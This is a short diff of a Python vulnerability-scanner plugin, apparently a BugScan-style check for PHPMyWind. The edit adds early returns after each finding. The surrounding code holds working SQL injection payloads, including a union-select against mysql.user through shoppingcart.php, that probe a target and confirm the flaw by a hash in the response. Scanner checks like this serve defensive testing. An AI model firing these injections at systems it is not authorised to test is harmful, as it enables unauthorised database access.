@@ -14,6 +14,7 @@ def audit(arg):
     code, head, body, errcode, final_url = curl.curl2(target);
     if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
         security_hole(target)
+        return arg
     #No.2 refer=http://www.wooyun.org/bugs/wooyun-2010-049845
     payload1 = "shoppingcart.php?a=addshopingcart&goodsid=1%20and%20@`'`%20/*!50000union*/%20select%20null,null,null,null,null,null,null,null,null,null,md5(1),null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null,null%20from%20mysql.user%20where%201=1%20or%20@`'`&buynum=1&goodsattr=tpcs"
     target1 = arg + payload1
@@ -23,6 +24,7 @@ def audit(arg):
     code, head, body, errcode, final_url = curl.curl2(target2)
     if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
         security_hole('Step1: '+target1+'\nStep2: '+target2)
+        return arg
     #No.3 refer=http://www.wooyun.org/bugs/wooyun-2010-051687
     payload = "order.php?action=getarea"
     target = arg + payload
@@ -32,6 +34,7 @@ def audit(arg):
     if code == 200 and 'c4ca4238a0b923820dcc509a6f75849' in body:
         security_hole(target)
 
-if __name__ == '__main__':
-	from dummy import *
-	audit(assign('phpmywind', 'http://127.0.0.1/phpmywind-4.6.6/')[1])
+
+        return arg
+if __name__== '__main__':
+    from dummy import *
